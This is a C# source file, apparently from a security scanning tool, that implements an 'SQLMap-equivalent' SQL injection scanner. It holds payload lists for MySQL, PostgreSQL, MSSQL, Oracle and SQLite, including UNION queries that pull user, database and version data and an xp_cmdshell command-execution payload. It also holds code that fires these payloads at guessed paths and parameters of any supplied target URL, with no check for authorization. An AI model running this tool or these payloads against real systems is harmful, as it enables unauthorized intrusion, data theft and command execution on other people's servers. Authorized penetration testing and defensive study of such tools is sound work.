/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Discovery.Core.Interfaces;
using Discovery.Core.Models;
using Discovery.Core.Utilities;
using Discovery.Services.Scanning;
using Spectre.Console;

namespace Discovery.Services.Security.Specialized;

/// <summary>
/// SQLMap-equivalent SQL injection detection and exploitation service
/// Implements comprehensive SQL injection testing methodologies
/// </summary>
public class SqlMapEquivalent : IDisposable
{
    private readonly HttpClient _httpClient;
    private readonly SemaphoreSlim _semaphore;
    
    // SQL injection payloads categorized by database type and technique
    private Dictionary<string, List<string>> _sqlPayloads;
    private Dictionary<string, List<string>> _errorSignatures;
    private List<string> _blindPayloads;
    private List<string> _timeBasedPayloads;
    
    public SqlMapEquivalent()
    {
        _httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
        _semaphore = new SemaphoreSlim(10, 10); // Limit concurrent requests
        
        InitializeSqlPayloads();
        InitializeErrorSignatures();
        InitializeBlindPayloads();
        InitializeTimeBasedPayloads();
    }

    private void InitializeSqlPayloads()
    {
        _sqlPayloads = new Dictionary<string, List<string>>
        {
            ["mysql"] = new List<string>
            {
                "' OR '1'='1",
                "' OR 1=1#",
                "' OR 1=1/*",
                "' OR 1=1 LIMIT 1#",
                "' UNION SELECT NULL,NULL,NULL#",
                "' UNION SELECT 1,2,3#",
                "' UNION SELECT user(),database(),version()#",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0#",
                "' AND (SELECT SUBSTRING(@@version,1,1))='5'#",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64#"
            },
            ["postgresql"] = new List<string>
            {
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT version(),current_database(),user--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>64--"
            },
            ["mssql"] = new List<string>
            {
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version,db_name(),user_name()--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND ASCII(SUBSTRING((SELECT db_name()),1,1))>64--",
                "'; EXEC xp_cmdshell('dir')--"
            },
            ["oracle"] = new List<string>
            {
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL,NULL FROM dual--",
                "' UNION SELECT banner,NULL,NULL FROM v$version--",
                "' AND (SELECT COUNT(*) FROM all_tables)>0--"
            },
            ["sqlite"] = new List<string>
            {
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT sqlite_version(),NULL,NULL--"
            },
            ["generic"] = new List<string>
            {
                "'",
                "''",
                "\"",
                "\"\"",
                "')",
                "'))",
                "' OR 1=1",
                "' OR '1'='1",
                "' OR 'a'='a",
                "\" OR \"a\"=\"a",
                "') OR ('1'='1",
                "\") OR (\"1\"=\"1",
                "1' OR '1'='1",
                "1\" OR \"1\"=\"1",
                "admin'--",
                "admin\"--",
                "admin'#",
                "admin\"#",
                "admin'/*",
                "admin\"/*",
                "' OR 1=1#",
                "' OR 1=1--",
                "\" OR 1=1#",
                "\" OR 1=1--"
            }
        };
    }

    private void InitializeErrorSignatures()
    {
        _errorSignatures = new Dictionary<string, List<string>>
        {
            ["mysql"] = new List<string>
            {
                "MySQL server version",
                "mysql_fetch_array()",
                "mysql_fetch_assoc()",
                "mysql_fetch_object()",
                "mysql_numrows()",
                "Warning: mysql_",
                "MySQLSyntaxErrorException",
                "valid MySQL result",
                "check the manual that corresponds to your MySQL server version"
            },
            ["postgresql"] = new List<string>
            {
                "PostgreSQL query failed",
                "supplied argument is not a valid PostgreSQL result",
                "unterminated quoted string at or near",
                "pg_query() [:",
                "pg_exec() [:",
                "PostgreSQL",
                "Warning: pg_",
                "valid PostgreSQL result",
                "Npgsql\\."
            },
            ["mssql"] = new List<string>
            {
                "Microsoft OLE DB Provider for ODBC Drivers",
                "Microsoft OLE DB Provider for SQL Server",
                "Incorrect syntax near",
                "Unclosed quotation mark after the character string",
                "Microsoft JET Database Engine",
                "ADODB.Field error",
                "BOF or EOF",
                "ADODB.Command",
                "JET Database",
                "Access Database Engine",
                "SQLServer JDBC Driver",
                "SqlException"
            },
            ["oracle"] = new List<string>
            {
                "Oracle error",
                "Oracle driver",
                "Warning: oci_",
                "Warning: ora_",
                "Oracle JDBC Driver",
                "ORA-01756",
                "ORA-00921",
                "ORA-00936",
                "ORA-03113",
                "ORA-00937"
            },
            ["sqlite"] = new List<string>
            {
                "SQLite/JDBCDriver",
                "SQLite.Exception",
                "System.Data.SQLite.SQLiteException",
                "Warning: sqlite_",
                "sqlite3.OperationalError"
            }
        };
    }

    private void InitializeBlindPayloads()
    {
        _blindPayloads = new List<string>
        {
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a--",
            "' AND 'a'='b--",
            "\" AND \"a\"=\"a\"--",
            "\" AND \"a\"=\"b\"--",
            "') AND ('a'='a",
            "') AND ('a'='b",
            "\") AND (\"a\"=\"a",
            "\") AND (\"a\"=\"b"
        };
    }

    private void InitializeTimeBasedPayloads()
    {
        _timeBasedPayloads = new List<string>
        {
            // MySQL
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--", // SQL Server
            "'; SELECT pg_sleep(5)--", // PostgreSQL
            "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(MID(@@version,1,1),FLOOR(RAND(0)*2)))--"
        };
    }

    public async Task<List<ScanResult>> ScanAsync(string target, CancellationToken cancellationToken = default)
    {
        var results = new ConcurrentBag<ScanResult>();
        
        if (!TestEnvironmentDetector.IsTestEnvironment)
        {
            AnsiConsole.MarkupLine($"[yellow]🔍 Starting SQL injection scan on {target}...[/]");
        }

        // Test different URL formats
        var testUrls = GenerateTestUrls(target);
        
        var tasks = testUrls.Select(async url =>
        {
            await _semaphore.WaitAsync(cancellationToken);
            try
            {
                var vulnerabilities = await TestSqlInjectionAsync(url, cancellationToken);
                foreach (var vuln in vulnerabilities)
                {
                    results.Add(vuln);
                }
            }
            finally
            {
                _semaphore.Release();
            }
        });

        await Task.WhenAll(tasks);
        return results.ToList();
    }

    private List<string> GenerateTestUrls(string target)
    {
        var urls = new List<string>();
        
        // Ensure proper URL format
        if (!target.StartsWith("http://") && !target.StartsWith("https://"))
        {
            target = "http://" + target;
        }

        // Common vulnerable endpoints
        var commonPaths = new[]
        {
            "/",
            "/login",
            "/admin",
            "/search",
            "/index.php",
            "/admin.php",
            "/login.php",
            "/search.php",
            "/products.php",
            "/user.php",
            "/page.php",
            "/article.php",
            "/news.php",
            "/show.php"
        };

        var commonParams = new[]
        {
            "id", "user", "username", "email", "search", "q", "query", "page", "cat", "category",
            "type", "sort", "order", "limit", "offset", "item", "product", "article", "news"
        };

        foreach (var path in commonPaths)
        {
            foreach (var param in commonParams)
            {
                urls.Add($"{target.TrimEnd('/')}{path}?{param}=1");
            }
        }

        // Add base URL
        urls.Add(target);

        return urls.Distinct().ToList();
    }

    private async Task<List<ScanResult>> TestSqlInjectionAsync(string url, CancellationToken cancellationToken)
    {
        var results = new List<ScanResult>();
        
        try
        {
            // 1. Error-based SQL injection testing
            var errorResults = await TestErrorBasedSqlInjection(url, cancellationToken);
            results.AddRange(errorResults);

            // 2. Boolean-based blind SQL injection
            var blindResults = await TestBlindSqlInjection(url, cancellationToken);
            results.AddRange(blindResults);

            // 3. Time-based blind SQL injection
            var timeResults = await TestTimeBasedSqlInjection(url, cancellationToken);
            results.AddRange(timeResults);

            // 4. Union-based SQL injection
            var unionResults = await TestUnionBasedSqlInjection(url, cancellationToken);
            results.AddRange(unionResults);
        }
        catch (Exception ex)
        {
            if (!TestEnvironmentDetector.IsTestEnvironment)
            {
                AnsiConsole.MarkupLine($"[red]Error testing {url}: {ex.Message}[/]");
            }
        }

        return results;
    }

    private async Task<List<ScanResult>> TestErrorBasedSqlInjection(string url, CancellationToken cancellationToken)
    {
        var results = new List<ScanResult>();
        
        foreach (var dbType in _sqlPayloads.Keys)
        {
            foreach (var payload in _sqlPayloads[dbType])
            {
                if (cancellationToken.IsCancellationRequested) break;

                try
                {
                    var testUrl = InjectPayload(url, payload);
                    var response = await _httpClient.GetStringAsync(testUrl, cancellationToken);
                    
                    // Check for database error signatures
                    var detectedDb = DetectDatabaseFromErrors(response);
                    if (!string.IsNullOrEmpty(detectedDb))
                    {
                        var result = CreateScanResult(url, "Error-based SQL Injection", 
                            $"Database: {detectedDb}, Payload: {payload}",
                            "CRITICAL", testUrl);
                        results.Add(result);
                        
                        if (!TestEnvironmentDetector.IsTestEnvironment)
                        {
                            AnsiConsole.MarkupLine($"[red]💀 SQL INJECTION FOUND: {url} (Error-based, {detectedDb})[/]");
                        }
                        break; // Found vulnerability, no need to test more payloads for this DB
                    }
                }
                catch (HttpRequestException)
                {
                    // Request failed, could indicate SQL injection
                    var result = CreateScanResult(url, "Potential SQL Injection", 
                        $"Request failed with payload: {payload}",
                        "HIGH", url);
                    results.Add(result);
                }
                catch
                {
                    // Other errors, continue
                }

                // Rate limiting
                await Task.Delay(100, cancellationToken);
            }
        }

        return results;
    }

    private async Task<List<ScanResult>> TestBlindSqlInjection(string url, CancellationToken cancellationToken)
    {
        var results = new List<ScanResult>();

        try
        {
            // Get baseline response
            var baselineResponse = await _httpClient.GetStringAsync(url, cancellationToken);
            var baselineLength = baselineResponse.Length;

            var truePayloads = new[] { "' AND 1=1--", "' AND 'a'='a--" };
            var falsePayloads = new[] { "' AND 1=2--", "' AND 'a'='b--" };

            foreach (var truePayload in truePayloads)
            {
                var trueUrl = InjectPayload(url, truePayload);
                var trueResponse = await _httpClient.GetStringAsync(trueUrl, cancellationToken);
                
                foreach (var falsePayload in falsePayloads)
                {
                    var falseUrl = InjectPayload(url, falsePayload);
                    var falseResponse = await _httpClient.GetStringAsync(falseUrl, cancellationToken);
                    
                    // Compare responses - if TRUE and FALSE responses are different, potential blind SQLi
                    if (Math.Abs(trueResponse.Length - falseResponse.Length) > 50 ||
                        !trueResponse.Equals(falseResponse))
                    {
                        var result = CreateScanResult(url, "Boolean-based Blind SQL Injection",
                            $"TRUE payload: {truePayload}, FALSE payload: {falsePayload}",
                            "HIGH", url);
                        results.Add(result);
                        
                        if (!TestEnvironmentDetector.IsTestEnvironment)
                        {
                            AnsiConsole.MarkupLine($"[red]💀 BLIND SQL INJECTION FOUND: {url}[/]");
                        }
                        break;
                    }
                }
                
                await Task.Delay(200, cancellationToken);
            }
        }
        catch
        {
            // Error during blind testing
        }

        return results;
    }

    private async Task<List<ScanResult>> TestTimeBasedSqlInjection(string url, CancellationToken cancellationToken)
    {
        var results = new List<ScanResult>();

        foreach (var payload in _timeBasedPayloads)
        {
            if (cancellationToken.IsCancellationRequested) break;

            try
            {
                var testUrl = InjectPayload(url, payload);
                var startTime = DateTime.UtcNow;
                
                await _httpClient.GetStringAsync(testUrl, cancellationToken);
                
                var elapsedTime = DateTime.UtcNow - startTime;
                
                // If response took longer than expected, potential time-based SQLi
                if (elapsedTime.TotalSeconds > 4)
                {
                    var result = CreateScanResult(url, "Time-based Blind SQL Injection",
                        $"Payload: {payload}, Response time: {elapsedTime.TotalSeconds:F2}s",
                        "HIGH", testUrl);
                    results.Add(result);
                    
                    if (!TestEnvironmentDetector.IsTestEnvironment)
                    {
                        AnsiConsole.MarkupLine($"[red]💀 TIME-BASED SQL INJECTION FOUND: {url} ({elapsedTime.TotalSeconds:F2}s delay)[/]");
                    }
                    break;
                }
            }
            catch
            {
                // Request timeout or error
            }
            
            await Task.Delay(500, cancellationToken);
        }

        return results;
    }

    private async Task<List<ScanResult>> TestUnionBasedSqlInjection(string url, CancellationToken cancellationToken)
    {
        var results = new List<ScanResult>();

        var unionPayloads = new[]
        {
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 'a','b','c'--",
            "' UNION SELECT version(),database(),user()--"
        };

        foreach (var payload in unionPayloads)
        {
            if (cancellationToken.IsCancellationRequested) break;

            try
            {
                var testUrl = InjectPayload(url, payload);
                var response = await _httpClient.GetStringAsync(testUrl, cancellationToken);
                
                // Look for common union injection indicators
                if (response.Contains("MySQL") || response.Contains("PostgreSQL") || 
                    response.Contains("Microsoft") || response.Contains("Oracle") ||
                    Regex.IsMatch(response, @"\d+\.\d+\.\d+") || // Version numbers
                    response.Contains("root@") || response.Contains("administrator"))
                {
                    var result = CreateScanResult(url, "Union-based SQL Injection",
                        $"Payload: {payload}",
                        "CRITICAL", testUrl);
                    results.Add(result);
                    
                    if (!TestEnvironmentDetector.IsTestEnvironment)
                    {
                        AnsiConsole.MarkupLine($"[red]💀 UNION SQL INJECTION FOUND: {url}[/]");
                    }
                    break;
                }
            }
            catch
            {
                // Request failed
            }
            
            await Task.Delay(100, cancellationToken);
        }

        return results;
    }

    private string InjectPayload(string url, string payload)
    {
        // If URL has parameters, inject into each parameter
        if (url.Contains("?"))
        {
            var parts = url.Split('?');
            var baseUrl = parts[0];
            var queryString = parts[1];
            
            // Inject payload into first parameter for simplicity
            var paramParts = queryString.Split('&');
            if (paramParts.Length > 0)
            {
                var firstParam = paramParts[0];
                var keyValue = firstParam.Split('=');
                if (keyValue.Length == 2)
                {
                    paramParts[0] = $"{keyValue[0]}={keyValue[1]}{Uri.EscapeDataString(payload)}";
                }
            }
            
            return $"{baseUrl}?{string.Join("&", paramParts)}";
        }
        
        // If no parameters, add a test parameter
        return $"{url}?id=1{Uri.EscapeDataString(payload)}";
    }

    private string DetectDatabaseFromErrors(string response)
    {
        foreach (var db in _errorSignatures.Keys)
        {
            if (_errorSignatures[db].Any(signature => 
                response.Contains(signature, StringComparison.OrdinalIgnoreCase)))
            {
                return db;
            }
        }
        return string.Empty;
    }

    private ScanResult CreateScanResult(string url, string vulnerability, string details, string severity, string testUrl)
    {
        // Extract host from URL
        var uri = new Uri(url);
        var ipAddress = IPAddress.TryParse(uri.Host, out var ip) ? ip : IPAddress.Loopback;
        
        return new ScanResult(
            ipAddress,
            uri.Port,
            true,
            "HTTP/HTTPS",
            0,
            "Unknown",
            details,
            DateTime.UtcNow,
            "Unknown",
            uri.Host,
            true,
            $"{severity}: {vulnerability} - {details}",
            "Web Application"
        );
    }

    public void Dispose()
    {
        _httpClient?.Dispose();
        _semaphore?.Dispose();
    }
}